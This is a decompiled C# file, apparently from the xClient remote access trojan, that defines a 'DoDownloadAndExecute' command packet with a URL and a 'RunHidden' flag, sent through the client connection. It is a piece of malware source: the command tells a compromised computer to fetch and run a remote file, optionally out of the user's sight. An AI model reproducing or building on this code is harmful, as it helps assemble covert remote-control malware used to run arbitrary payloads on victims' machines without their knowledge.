using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
	// Token: 0x020000DC RID: 220
	[Serializable]
	public class DoDownloadAndExecute : IPacket
	{
		// Token: 0x17000110 RID: 272
		// (get) Token: 0x06000590 RID: 1424 RVA: 0x00004AA0 File Offset: 0x00002CA0
		// (set) Token: 0x06000591 RID: 1425 RVA: 0x00004AA8 File Offset: 0x00002CA8
		public string URL { get; set; }

		// Token: 0x17000111 RID: 273
		// (get) Token: 0x06000592 RID: 1426 RVA: 0x00004AB1 File Offset: 0x00002CB1
		// (set) Token: 0x06000593 RID: 1427 RVA: 0x00004AB9 File Offset: 0x00002CB9
		public bool RunHidden { get; set; }

		// Token: 0x06000594 RID: 1428 RVA: 0x000021D4 File Offset: 0x000003D4
		public DoDownloadAndExecute()
		{
		}

		// Token: 0x06000595 RID: 1429 RVA: 0x00004AC2 File Offset: 0x00002CC2
		public DoDownloadAndExecute(string url, bool runhidden)
		{
			this.URL = url;
			this.RunHidden = runhidden;
		}

		// Token: 0x06000596 RID: 1430 RVA: 0x00004AD8 File Offset: 0x00002CD8
		public void Execute(Client client)
		{
			client.Send<DoDownloadAndExecute>(this);
		}
	}
}
